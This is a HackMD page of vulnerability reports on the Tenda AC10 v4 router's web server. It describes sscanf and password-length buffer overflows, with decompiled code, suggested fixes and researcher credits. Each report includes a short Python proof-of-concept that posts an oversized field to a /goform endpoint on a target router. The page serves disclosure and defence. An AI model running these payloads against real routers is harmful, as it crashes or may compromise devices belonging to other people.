<!DOCTYPE html>
<html lang="en-US" data-themeable="true">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="csrf-token" content="UV7s8YJ1-d5jAI9mJu1o4kn5dnGXJgm7xFi4">
    
    
    <meta name="description" content="Product: AC10 v4">
    
    <title>Tenda reports - HackMD</title>
    <link rel="icon" type="image/png" href="https://hackmd.io/favicon.png">
	<link rel="apple-touch-icon" href="https://hackmd.io/apple-touch-icon.png">
	<!--  meta value for server side given sign in boolean -->
    <meta name="signin" content="false">

    
<script nonce="2cce4624-734f-4805-bc36-3befbecdf697">
  window.domain = 'hackmd.io'
  window.urlpath = ''
  window.debug = false || window.localStorage.getItem('HMD_DEBUG_FLAG') === 'true'
  window.version = '1.3.0'
  window.brand = 'HackMD'

  
  window.NOTE_ID = '2cfDRr--SeinWnvGOY8jpQ'
  

  window.GOOGLE_DRIVE_API_KEY = 'AIzaSyAHmcP5gL_64ZafuAYOvJruFAIaYgHQaY4'
  window.GOOGLE_DRIVE_CLIENT_ID = '65857506266-76uhhee8se8dgs1i0q8fhtj1prg0ar27.apps.googleusercontent.com'
  window.DROPBOX_APP_KEY = 'rdoizrlnkuha23r'
  
  window.PLANTUML_SERVER = 'https://ptuml.hackmd.io'

  window.ASSET_URL = 'https://assets.hackmd.io'

  window.USER_CAN_CREATE_TEAM = true
  window.USER_CAN_DELETE_ACCOUNT = true
  window.USER_DELETE_ACCOUNT_VIA_EMAIL = true
  window.PAYMENT_ENABLED = true
  window.PAYMENT_PROMOTION_BANNER_ENABLED = false
  window.GITHUB_SYNC_ENABLED = true
  window.GITLAB_SYNC_ENABLED = false
  window.GITLAB_SYNC_BASE_URL = ''
  window.VCS_SYNC_MODE = 'github'
  window.VCS_PROVIDER_NAME = 'GitHub'
  window.FREE_TEAM_NUM = 20
  window.FREE_TEAM_MEMBER_NUM = 3
  window.FREE_PUBLIC_TEAM_NUM = 10
  window.NEO_OVERVIEW_UI = true
  window.FOLDER_ENABLE = true
  
  window.EE_SITE_ENABLE = false
  window.EE_SITE_NAME = 'false'
  window.EE_SITE_LINK = 'false'
  window.EESITE_INFO = false
  window.ENTERPRISE_DISCOVERY_ENABLE = false
  window.ENTERPRISE_DISCOVERY_TEAM = true
  window.ENTERPRISE_DISCOVERY_NOTE = true
  window.ENTERPRISE_DISCOVERY_VIEW_PERMISSION = 'guest'
  
  window.ALLOW_ANONYMOUS = true
  window.ALLOW_ANONYMOUS_EDIT = false
  window.ALLOW_DOWNLOAD_PDF = true
  window.PUBLIC_OVERVIEW = false
  window.INTERNAL_PUBLIC_OVERVIEW = false
  window.FULL_TEXT_SEARCH_ENABLE = false
  window.ALGOLIA_SEARCH_ENABLE = true
  window.MARKETING_EMAIL_ENABLE = true
  window.OFFLINE_ACCESS = true
  
  
  
    window.WALLET_CONNECT_PROJECT_ID = '91d6fa182b725b5895a17a170a5878c1'
  
  window.API_MANAGEMENT_UI_ENABLE = true
  window.FEEDBACK_UI_ENABLE = true
  window.PUBLISH_ENABLE = true

  

  
  window.SHOW_HOT_NOTES = false
  

  
  window.HOT_NOTES_TIME_TYPE = 'week'
  

  
  window.SHOW_OVERVIEW = false
  

  
  window.MENTIONS = {}
  

  
  window.MENTION_ANCHORS = []
  

  
  window.COMMENT_ANCHORS = []
  

  
  window.IS_OWNER = false
  

  
  window.IS_TEAM_ADMIN = false
  

  
  window.IS_INVITEE_ADMIN = false
  

  
  window.USER_PROFILE = '%7B%22name%22%3A%22Guest%20Miles%22%7D'
  

  
  window.VERSION_TIME = '1713408822099'
  

  
  window.canEdit = false
  

  
  window.canWriteComment = false
  

  
  window.canHideComment = false
  

  window.TRASH_NOTE_DELETE_AFTER_FREE = 3
  window.TRASH_NOTE_DELETE_AFTER_PAID = 30

  
    window.ENABLED_PREVIEW_FEATURE = {}
  

  
    window.IS_OWNER_UPGRADED = false
  

  
    window.IMGUR_FALLBACK_CDN = 'https://imgur-backup.hackmd.io'
  

  
    window.CLOUD_META_UI = true
  
  
    window.CLOUD_META_API = true
  
  
    window.CLOUD_META_MIGRATION = false
  
  
    window.YAML_METADATA_ENABLED = false
  

  
    window.NOTE_CAPACITY_LIMIT = 50
  

  
    window.DOCUMENT_MAX_LENGTH = 100000
  

  
    window.SOCIAL_NETWORK_FEATURES_ENABLED = true
  

  
    window.PUBLISHMENT_MODERATION_ENABLED = true
  

  
    window.COMMENT_ENABLED = true
  

  window.SUGGEST_EDIT_ENABLED = true
  
    window.SUGGEST_EDIT_ENABLED = true
  

  
    window.REALTIME_CLIENT_WITH_CREDENTIALS = false
  

  
    window.COMMENT_ENABLED = true
  

  
    window.DEBUG_DISCONNECT_SOCKET_WHEN_OFFLINE = false
  

  

  

  

  
    window.CUSTOM_STYLE_ENABLED = "true"
  

  
    window.USE_NEW_LOGO = true
  

  
    window.ITERABLE_ENABLED = true
  
  
    window.ITERABLE_API_KEY = "c2c36a44c2614fb19aa3b46d660bbce2"
  

  
    window.TEXT_SELECTION_CHANGED = false
  

  
    window.CAN_VIEW_HISTORY_AT_REVISION = false
  
</script>


    
<!-- Google Tag Manager -->
<script nonce="2cce4624-734f-4805-bc36-3befbecdf697">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-KLW9Z3');</script>
<!-- End Google Tag Manager -->


    





    <meta property="fb:app_id" content="1436904003272070">



    <meta name="twitter:image:src" content="https://hackmd.io/images/media/HackMD-neo-og.jpg">
    <meta name="twitter:image:alt" content="Tenda reports - HackMD">


<meta name="twitter:site" content="@hackmdio" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="Tenda reports - HackMD" />


    <meta name="twitter:description" content="Product: AC10 v4" />



    <meta property="og:image" content="https://hackmd.io/images/media/HackMD-neo-og.jpg">
    <meta property="og:image:alt" content="Tenda reports - HackMD">


<meta property="og:site_name" content="HackMD" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Tenda reports - HackMD" />


    <meta property="og:description" content="Product: AC10 v4" />




     <link href="https://assets.hackmd.io/build/font-vendor.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/font-vendor.ea8218d7d4f468b2c430.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/common-vendor.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/common-vendor.0a08ae20e14fefe857eb.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty-vendor.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty-vendor.db0e7b64c54d0a77290f.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty.206c1db4aa617ea5aa67.css" rel="stylesheet">
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g=" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE=" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js" integrity="sha256-8E4Is26QH0bD52WoQpcB+R/tcWQtpzlCojrybUd7Mxo=" crossorigin="anonymous"></script>
<![endif]-->

    


    <script defer data-domain="hackmd.io" src="https://plausible.io/js/script.js"></script>
<script nonce="2cce4624-734f-4805-bc36-3befbecdf697">
  window.plausible = window.plausible || function() { (window.plausible.q = window.plausible.q || []).push(arguments); }
  const keyboardWhiteList = ['a', 'span', 'button']

  function getTaggedEventAttributes (e) {
    const eventAttrs = { name: null, props: {} }
    if (!e || !e.classList) return eventAttrs
    const psEvent = /plausible-event-(.+)(=|--)(.+)/
    for (const className of [...e.classList]) {
      const [, key, , val] = className.match(psEvent) || []
      if (!key || !val) continue
      const value = val.replace(/\+/g, ' ')
      switch (key.toLowerCase()) {
        case 'name':
          eventAttrs.name = value
          break
        default:
          eventAttrs.props[key] = value
          break
      }
    }
    return eventAttrs
  }

  function isLocal () {
    return /^localhost$|^127(\.[0-9]+){0,2}\.[0-9]+$|^\[::1?\]$/.test(location.hostname) || location.protocol === 'file:'
  }

  function isAutomation () {
    return Boolean(window._phantom || window.__nightmare || window.navigator.webdriver || window.Cypress)
  }

  function shouldIgnore () {
    return isLocal() ||
      isAutomation() ||
      window.localStorage.getItem('plausible_ignore') === 'true'
  }

  function handler (e) {
    if (!window.plausible) return
    if (!e.target || !('className' in e.target)) return
    const ele = e.target

    const eventAttrs = getTaggedEventAttributes(ele)
    if (!eventAttrs.name) return
    if (ele?.href) eventAttrs.props.url = ele.href

    if (shouldIgnore()) {
      if (window.debug) logDebugEventMsg(eventAttrs)
      return
    }
    window.plausible(eventAttrs.name, { props: eventAttrs.props })
  }

  function logDebugEventMsg (eventAttrs) {
    console.warn(
      `Ignoring Event: "${eventAttrs.name}"`,
      eventAttrs,
    )
  }

  function keydownHandler (e) {
    if (e.key !== 'Enter') return
    if (e.target.nodeName.toLowerCase() === 'input') {
      switch (e.target.type.toLowerCase()) {
        case 'submit':
        case 'button':
        case 'reset':
        case 'checkbox':
        case 'radio':
        case 'file':
        case 'image':
        case 'color':
          break
        default:
          return
      }
    } else if (!keyboardWhiteList.includes(e.target.nodeName.toLowerCase())) {
      return
    }
    handler(e)
  }

  document.addEventListener('mousedown', handler)
  document.addEventListener('keydown', keydownHandler)
</script>

    
<script nonce="2cce4624-734f-4805-bc36-3befbecdf697">
  window.publishProps = JSON.parse(`{"isOwnerAnonymous":false,"isOwnedByTeam":false,"ownerInfo":{"name":"HUU%20TRI%20NGUYEN","path":"JohnathanHuuTri","avatarUrl":"https%3A%2F%2Flh3.googleusercontent.com%2Fa%2FALm5wu23npg0Dnw_Q3Nr0KKIZ0VXSwd8hXNFvX3g27tCag%3Ds96-c","description":null},"isPublished":false,"createTime":1712051195611,"updateTime":1713408822099,"vcsSyncMode":"github","vcsProviderName":"GitHub","canEdit":false,"hardBreaks":true,"onlyOwnerCanEdit":true,"isCommentEnabled":true,"likedCount":0,"isNotificationEnabled":true,"notificationType":"never","hasEmail":false,"canWriteComment":false,"viewCount":1224,"markdown":"%23%201.%20Buffer%20Overflow%20in%20Virtual_Data_Check%0A%0A%23%23%20Affected%20model(s)%20and%20firmware%2Fsoftware%20version(s)%0A%0AProduct%3A%20AC10%20v4%0A%0AVersion%3A%20US_AC10V4.0si_V16.03.10.20_cn%0A%0ABinary%3A%20%60%2Fbin%2Fhttpd%60%0A%0A%23%23%20Vulnerability%20description%20and%20potential%20impacts%0A%0AIn%20%60formSetVirtualSer%60%2C%20it%20reads%20value%20of%20key%20%60list%60%20upto%200x200%20bytes%20and%20passed%20as%20argument%20to%20function%20%60Virtual_Data_Check%60%3A%0A%0A%60%60%60c%0Amemset(acStack_514%2C%200%2C%200x100)%3B%0Amemset(auStack_414%2C%200%2C%200x201)%3B%0Amemset(auStack_210%2C%200%2C%200x201)%3B%0AiVar1%20%3D%20websSafeGetVar(param_1%2C%200xcc%2C%20%22list%22%2C%20%26%20DAT_004fb6b8%2C%20auStack_414)%3B%0Aif%20(iVar1%20%3D%3D%201)%20%7B%0A%20%20%20%20printf(%22Error%3A%20Get%20WEB%20value%20failed%2C%20idx%5B%25d%5D%2Cvar%5B%25s%5D%5Cn%22%2C%200xcc%2C%20%26%20DAT_004fb6bc)%3B%0A%20%20%20%20websTransfer_errCode(param_1%2C%201)%3B%0A%7D%20else%20%7B%0A%20%20%20%20memcpy(auStack_210%2C%20auStack_414%2C%200x201)%3B%0A%20%20%20%20iVar1%20%3D%20Virtual_Data_Check(auStack_210)%3B%0A%20%20%20%20if%20(iVar1%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20save_virtualser_data(%22adv.virtualser%22%2C%20auStack_414%2C%200x7e)%3B%0A%60%60%60%0A%0AIn%20%60Virtual_Data_Check%60%2C%20it%20uses%20sscanf%20with%20format%20string%20%60%25%5B%5E%2C%5D%60%20and%20%60%25s%60%20to%20parse%20from%20param1%20to%204%20local%20variables.%20But%20the%20%60list%60%20can%20take%20upto%200x200%2C%20which%20will%20cause%20buffer%20overflow%3A%0A%0A%60%60%60c%0Aundefined4%20Virtual_Data_Check(char%20*%20param_1)%0A%7B%0A%20%20%20%20...%0A%20%20%20%20local_198%20%3D%20param_1%3B%0A%20%20%20%20if%20(%20*%20param_1%20%3D%3D%20'%5C0')%20%7B%0A%20%20%20%20%20%20%20%20uVar3%20%3D%200%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20while%20(pcVar4%20%3D%20strchr(local_198%2C%20L%20'~')%2C%20pcVar4%20!%3D%200x0)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20...%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20iVar5%20%3D%20sscanf(local_198%2C%20%22%25%5B%5E%2C%5D%2C%25%5B%5E%2C%5D%2C%25%5B%5E%2C%5D%2C%25s%22%2C%20%26%20local_168%2C%20%26%20local_138%2C%20%26%20local_128%2C%20%26%20local_118)%3B%0A%20%20%20%20%20%20%20%20...%0A%20%20%20%20%7D%0A%20%20%20%20return%20uVar3%3B%0A%7D%0A%60%60%60%0A%0A%23%23%20Step-by-step%20instructions%20to%20reproduce%20the%20issue%0A%0A-%20Step%201%3A%20Run%20httpd%0A-%20Step%202%3A%20Run%20the%20script%20in%20the%20next%20section%20with%20first%20argument%20is%20ip%20of%20server%0A%0A%23%23%20Proof-of-concept%20(PoC)%20or%20exploit%20code%20for%20the%20issue%0A%0A%60%60%60python%0A%23!%2Fusr%2Fbin%2Fpython3%0A%0Aimport%20sys%0Aimport%20requests%0A%0Apayload%20%3D%20b'2%2C'*3%0Apayload%20%3D%20payload.ljust(0x200%2C%20b'A')%0A%0Adef%20run()%3A%0A%20%20%20%20url%20%3D%20f%22http%3A%2F%2F%7Bsys.argv%5B1%5D%7D%2Fgoform%2FSetVirtualServerCfg%22%0A%20%20%20%20data%20%3D%20%7B%0A%20%20%20%20%20%20%20%20'list'%3A%20payload%2C%0A%20%20%20%20%7D%0A%20%20%20%20res%20%3D%20requests.post(url%3Durl%2Cdata%3Ddata)%0A%0Arun()%0A%60%60%60%0A%0A!%5BformSetVirtualSer%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FHklQiZCe0.gif)%0A%0A%23%23%20Any%20suggested%20solutions%20to%20fix%20this%0A%0AReduce%20max%20size%20in%20%60websSafeGetVar%60%20for%20%22list%22%0A%0A%23%23%20Severity%20(e.g.%20CVSS%20v3.x)%0A%0ABuffer%20Overflow%2C%20possible%20command%20injection%0A%0A%23%23%20Acknowledgement%0A%0ACao%20Ngoc%20Quy%2C%20Nguyen%20Huu%20Tri%20and%20Nguyen%20Le%20Quoc%20Anh%20of%20bl4ckh0l3%20from%20Galaxy%20One%0A%0A%23%23%20Assigned%20CVE%0A%0ANot%20yet%0A%0A%23%202.%20Buffer%20Overflow%20in%20route_static_check%0A%0A%23%23%20Affected%20model(s)%20and%20firmware%2Fsoftware%20version(s)%0A%0AProduct%3A%20AC10%20v4%0A%0AVersion%3A%20US_AC10V4.0si_V16.03.10.20_cn%0A%0ABinary%3A%20%60%2Fbin%2Fhttpd%60%0A%0A%23%23%20Vulnerability%20description%20and%20potential%20impacts%0A%0AIn%20%60fromSetRouteStatic%60%2C%20it%20reads%20value%20of%20key%20%60list%60%20upto%200x200%20bytes%20and%20passed%20as%20argument%20to%20function%20%60Virtual_Data_Check%60%3A%0A%0A%60%60%60c%0Amemset(acStack_514%2C%200%2C%200x100)%3B%0Amemset(auStack_414%2C%200%2C%200x201)%3B%0Amemset(auStack_210%2C%200%2C%200x201)%3B%0AiVar1%20%3D%20websSafeGetVar(param_1%2C%200xcb%2C%20%22list%22%2C%20%26%20DAT_004fb850%2C%20auStack_414)%3B%0Aif%20(iVar1%20%3D%3D%201)%20%7B%0A%20%20%20%20printf(%22Error%3A%20Get%20WEB%20value%20failed%2C%20idx%5B%25d%5D%2Cvar%5B%25s%5D%5Cn%22%2C%200xcb%2C%20%26%20DAT_004fb854)%3B%0A%20%20%20%20websTransfer_errCode(param_1%2C%201)%3B%0A%7D%20else%20%7B%0A%20%20%20%20memcpy(auStack_210%2C%20auStack_414%2C%200x201)%3B%0A%20%20%20%20iVar1%20%3D%20route_static_check(auStack_210)%3B%0A%20%20%20%20if%20(iVar1%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20save_staticroute_data%20(%22adv.staticroute%22%2C%20auStack_414%2C%20L%E2%80%99~%E2%80%99)%3B%0A%60%60%60%0A%0AIn%20route_static_check%2C%20it%20uses%20sscanf%20with%20format%20string%20%60%25%5B%5E%2C%5D%60%20and%20%60%25s%60%20to%20parse%20from%20param1%20to%204%20local%20variables.%20But%20the%20%22list%22%20can%20take%20upto%200x200%2C%20which%20will%20cause%20buffer%20overflow%3A%0A%0A%60%60%60c%0Aundefined4%20route_static_check(char%20*%20param_1)%0A%7B%0A%20%20%20%20...%0A%20%20%20%20local_58%20%3D%20param_1%3B%0A%20%20%20%20if%20(%20*%20param_1%20%3D%3D%20'%5C0')%20%7B%0A%20%20%20%20%20%20%20%20uVar1%20%3D%200%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20while%20(pcVar2%20%3D%20strchr(local_58%2C%20L%20'~')%2C%20pcVar2%20!%3D%200x0)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20...%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20iVar3%20%3D%20sscanf(local_58%2C%20%22%25%5B%5E%2C%5D%2C%25%5B%5E%2C%5D%2C%25%5B%5E%2C%5D%2C%25s%22%2C%20%26%20local_4c%2C%20%26%20local_3c%2C%20%26%20local_2c%2C%20%26%20local_1c)%3B%0A%20%20%20%20%20%20%20%20...%0A%20%20%20%20%7D%0A%20%20%20%20return%20uVar1%3B%0A%7D%0A%60%60%60%0A%0A%23%23%20Step-by-step%20instructions%20to%20reproduce%20the%20issue%0A%0A-%20Step%201%3A%20Run%20httpd%0A-%20Step%202%3A%20Run%20the%20script%20in%20the%20next%20section%20with%20first%20argument%20is%20ip%20of%20server%0A%0A%23%23%20Proof-of-concept%20(PoC)%20or%20exploit%20code%20for%20the%20issue%0A%0A%60%60%60python%0A%23!%2Fusr%2Fbin%2Fpython3%0A%0Aimport%20sys%0Aimport%20requests%0A%0Apayload%20%3D%20b'2%2C'*3%0Apayload%20%3D%20payload.ljust(0x200%2C%20b'A')%0A%0Adef%20run()%3A%0A%20%20%20%20url%20%3D%20f%22http%3A%2F%2F%7Bsys.argv%5B1%5D%7D%2Fgoform%2FSetStaticRouteCfg%22%0A%20%20%20%20data%20%3D%20%7B%0A%20%20%20%20%20%20%20%20'list'%3A%20payload%2C%0A%20%20%20%20%7D%0A%20%20%20%20res%20%3D%20requests.post(url%3Durl%2Cdata%3Ddata)%0A%0Arun()%0A%60%60%60%0A%0A!%5BfromSetRouteStatic%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSyoEj-AeR.gif)%0A%0A%23%23%20Any%20suggested%20solutions%20to%20fix%20this%0A%0AReduce%20max%20size%20in%20%60websSafeGetVar%60%20for%20%22list%22%0A%0A%23%23%20Severity%20(e.g.%20CVSS%20v3.x)%0A%0ABuffer%20Overflow%2C%20possible%20command%20injection%0A%0A%23%23%20Acknowledgement%0A%0ACao%20Ngoc%20Quy%2C%20Nguyen%20Huu%20Tri%20and%20Nguyen%20Le%20Quoc%20Anh%20of%20bl4ckh0l3%20from%20Galaxy%20One%0A%0A%23%23%20Assigned%20CVE%0A%0ANot%20yet%0A%0A%23%203.%20Possible%20Buffer%20Overflow%20in%20fromSysToolChangePwd%0A%0A%23%23%20Affected%20model(s)%20and%20firmware%2Fsoftware%20version(s)%0A%0AProduct%3A%20AC10%20v4%0A%0AVersion%3A%20US_AC10V4.0si_V16.03.10.20_cn%0A%0ABinary%3A%20%60%2Fbin%2Fhttpd%60%0A%0A%23%23%20Vulnerability%20description%20and%20potential%20impacts%0A%0AIn%20fromSysToolChangePwd%2C%20it%20gets%20SYSOPS%20from%20request%20without%20limited%20the%20length%3A%0A%0A%60%60%60c%0Asysops%20%3D%20websGetVar(param_1%2C%20%22SYSOPS%22%2C%20%26%20DAT_004fd3e0)%3B%0Asysps%20%3D%20websGetVar(param_1%2C%20%22SYSPS%22%2C%20%26%20DAT_004fd3e0)%3B%0Asysps2%20%3D%20websGetVar(param_1%2C%20%22SYSPS2%22%2C%20%26%20DAT_004fd3e0)%3B%0AGetValue(%22sys.userpass%22%2C%20%26%20local_2c)%3B%0AiVar1%20%3D%20strcmp(%20%26%20local_2c%2C%20sysops)%3B%0Aif%20((iVar1%20!%3D%200)%20%7C%7C%20(iVar1%20%3D%20strcmp(sysps%2C%20sysps2)%2C%20iVar1%20!%3D%200))%20%7B%0A%20%20%20%20websRedirect(param_1%2C%20%22%2Fsystem_password.html%3F1%22)%3B%0A%20%20%20%20return%3B%0A%7D%0AiVar1%20%3D%20strcmp(sysops%2C%20sysps)%3B%0Aif%20(iVar1%20%3D%3D%200)%20%7B%0A%20%20%20%20websRedirect(param_1%2C%20%22%2Fsystem_password.html%22)%3B%0A%20%20%20%20return%3B%0A%7D%0ASetValue(%22sys.userpass%22%2C%20sysps)%3B%0A%60%60%60%0A%0AIt%20first%20executes%20%60GetValue%60%20to%20get%20current%20password%20and%20compares%20to%20make%20sure%20the%20current%20password%20is%20correct%2C%20then%20it%20saves%20new%20password%20using%20%60SetValue%60.%20But%20because%20new%20password%20(which%20is%20%60SYSPS%60)%20isn%E2%80%99t%20limited%20in%20length%20so%20after%20we%20set%20new%20password%2C%20we%20execute%20%60fromSysToolChangePwd%60%20again%2C%20it%20gets%20current%20password%20via%20%60GetValue%60%20and%20can%20cause%20buffer%20overflow%20for%20%60local_2c%60%20variable.%0A%0A%23%23%20Step-by-step%20instructions%20to%20reproduce%20the%20issue%0A%0A-%20Step%201%3A%20Run%20httpd%0A-%20Step%202%3A%20Run%20the%20script%20in%20the%20next%20section%20with%20first%20argument%20is%20ip%20of%20server%20and%20second%20argument%20is%20old%20password%0A%0A%23%23%20Proof-of-concept%20(PoC)%20or%20exploit%20code%20for%20the%20issue%0A%0A%60%60%60python%0A%23!%2Fusr%2Fbin%2Fpython3%0A%0Aimport%20sys%0Aimport%20requests%0A%0Apayload%20%3D%20b'A'*0x200%0A%0Adef%20run()%3A%0A%20%20%20%20url%20%3D%20f%22http%3A%2F%2F%7Bsys.argv%5B1%5D%7D%2Fgoform%2FSysToolChangePwd%22%0A%20%20%20%20data%20%3D%20%7B%0A%20%20%20%20%20%20%20%20%22SYSOPS%22%3A%20sys.argv%5B2%5D%2C%0A%20%20%20%20%20%20%20%20%22SYSPS%22%3A%20payload%2C%0A%20%20%20%20%20%20%20%20%22SYSPS2%22%3A%20payload%0A%20%20%20%20%7D%0A%20%20%20%20requests.post(url%3Durl%2C%20data%3Ddata)%0A%20%20%20%20requests.post(url%3Durl%2C%20data%3Ddata)%0A%0Arun()%0A%60%60%60%0A%0A%23%23%20Any%20suggested%20solutions%20to%20fix%20this%0A%0ACheck%20password%20length%20before%20save%0A%0A%23%23%20Severity%20(e.g.%20CVSS%20v3.x)%0A%0APossible%20Buffer%20Overflow%2C%20possible%20command%20injection%0A%0A%23%23%20Acknowledgement%0A%0ACao%20Ngoc%20Quy%2C%20Nguyen%20Huu%20Tri%20and%20Nguyen%20Le%20Quoc%20Anh%20of%20bl4ckh0l3%20from%20Galaxy%20One%0A%0A%23%23%20Assigned%20CVE%0A%0ANot%20yet","viewMode":"publish","isOwner":false,"isSignIn":false,"isLiked":false,"isBookmarked":false,"publishType":"view","commentCount":0,"isNotesRecommendationsEnabled":true,"recommendedNotes":[],"lastChangeUserInfo":{"name":"HUU%20TRI%20NGUYEN","path":"JohnathanHuuTri","avatarUrl":"https%3A%2F%2Flh3.googleusercontent.com%2Fa%2FALm5wu23npg0Dnw_Q3Nr0KKIZ0VXSwd8hXNFvX3g27tCag%3Ds96-c"}}`);
  (function () {
    const decodeStringProps = (props) => {
      for (const key in props) {
        if (typeof props[key] === 'string') {
          props[key] = decodeURIComponent(props[key])
        } else if (typeof props[key] === 'object') {
          decodeStringProps(props[key])
        }
      }
    }
    decodeStringProps(window.publishProps)
  })()
</script>

    <script src="https://tally.so/widgets/embed.js"></script>

    
</head>

<body style="display:none;">
    <div id="toasts-container" class="toasts-container z-[2000]"></div>
    <div id="publish-page"># 1. Buffer Overflow in Virtual_Data_Check

## Affected model(s) and firmware/software version(s)

Product: AC10 v4

Version: US_AC10V4.0si_V16.03.10.20_cn

Binary: `/bin/httpd`

## Vulnerability description and potential impacts

In `formSetVirtualSer`, it reads value of key `list` upto 0x200 bytes and passed as argument to function `Virtual_Data_Check`:

```c
memset(acStack_514, 0, 0x100);
memset(auStack_414, 0, 0x201);
memset(auStack_210, 0, 0x201);
iVar1 = websSafeGetVar(param_1, 0xcc, &#34;list&#34;, &amp; DAT_004fb6b8, auStack_414);
if (iVar1 == 1) {
    printf(&#34;Error: Get WEB value failed, idx[%d],var[%s]\n&#34;, 0xcc, &amp; DAT_004fb6bc);
    websTransfer_errCode(param_1, 1);
} else {
    memcpy(auStack_210, auStack_414, 0x201);
    iVar1 = Virtual_Data_Check(auStack_210);
    if (iVar1 == 0) {
        save_virtualser_data(&#34;adv.virtualser&#34;, auStack_414, 0x7e);
```

In `Virtual_Data_Check`, it uses sscanf with format string `%[^,]` and `%s` to parse from param1 to 4 local variables. But the `list` can take upto 0x200, which will cause buffer overflow:

```c
undefined4 Virtual_Data_Check(char * param_1)
{
    ...
    local_198 = param_1;
    if ( * param_1 == &#39;\0&#39;) {
        uVar3 = 0;
    } else {
        while (pcVar4 = strchr(local_198, L &#39;~&#39;), pcVar4 != 0x0) {
            ...
        }
        iVar5 = sscanf(local_198, &#34;%[^,],%[^,],%[^,],%s&#34;, &amp; local_168, &amp; local_138, &amp; local_128, &amp; local_118);
        ...
    }
    return uVar3;
}
```

## Step-by-step instructions to reproduce the issue

- Step 1: Run httpd
- Step 2: Run the script in the next section with first argument is ip of server

## Proof-of-concept (PoC) or exploit code for the issue

```python
#!/usr/bin/python3

import sys
import requests

payload = b&#39;2,&#39;*3
payload = payload.ljust(0x200, b&#39;A&#39;)

def run():
    url = f&#34;http://{sys.argv[1]}/goform/SetVirtualServerCfg&#34;
    data = {
        &#39;list&#39;: payload,
    }
    res = requests.post(url=url,data=data)

run()
```

![formSetVirtualSer](https://hackmd.io/_uploads/HklQiZCe0.gif)

## Any suggested solutions to fix this

Reduce max size in `websSafeGetVar` for &#34;list&#34;

## Severity (e.g. CVSS v3.x)

Buffer Overflow, possible command injection

## Acknowledgement

Cao Ngoc Quy, Nguyen Huu Tri and Nguyen Le Quoc Anh of bl4ckh0l3 from Galaxy One

## Assigned CVE

Not yet

# 2. Buffer Overflow in route_static_check

## Affected model(s) and firmware/software version(s)

Product: AC10 v4

Version: US_AC10V4.0si_V16.03.10.20_cn

Binary: `/bin/httpd`

## Vulnerability description and potential impacts

In `fromSetRouteStatic`, it reads value of key `list` upto 0x200 bytes and passed as argument to function `Virtual_Data_Check`:

```c
memset(acStack_514, 0, 0x100);
memset(auStack_414, 0, 0x201);
memset(auStack_210, 0, 0x201);
iVar1 = websSafeGetVar(param_1, 0xcb, &#34;list&#34;, &amp; DAT_004fb850, auStack_414);
if (iVar1 == 1) {
    printf(&#34;Error: Get WEB value failed, idx[%d],var[%s]\n&#34;, 0xcb, &amp; DAT_004fb854);
    websTransfer_errCode(param_1, 1);
} else {
    memcpy(auStack_210, auStack_414, 0x201);
    iVar1 = route_static_check(auStack_210);
    if (iVar1 == 0) {
        save_staticroute_data (&#34;adv.staticroute&#34;, auStack_414, L’~’);
```

In route_static_check, it uses sscanf with format string `%[^,]` and `%s` to parse from param1 to 4 local variables. But the &#34;list&#34; can take upto 0x200, which will cause buffer overflow:

```c
undefined4 route_static_check(char * param_1)
{
    ...
    local_58 = param_1;
    if ( * param_1 == &#39;\0&#39;) {
        uVar1 = 0;
    } else {
        while (pcVar2 = strchr(local_58, L &#39;~&#39;), pcVar2 != 0x0) {
            ...
        }
        iVar3 = sscanf(local_58, &#34;%[^,],%[^,],%[^,],%s&#34;, &amp; local_4c, &amp; local_3c, &amp; local_2c, &amp; local_1c);
        ...
    }
    return uVar1;
}
```

## Step-by-step instructions to reproduce the issue

- Step 1: Run httpd
- Step 2: Run the script in the next section with first argument is ip of server

## Proof-of-concept (PoC) or exploit code for the issue

```python
#!/usr/bin/python3

import sys
import requests

payload = b&#39;2,&#39;*3
payload = payload.ljust(0x200, b&#39;A&#39;)

def run():
    url = f&#34;http://{sys.argv[1]}/goform/SetStaticRouteCfg&#34;
    data = {
        &#39;list&#39;: payload,
    }
    res = requests.post(url=url,data=data)

run()
```

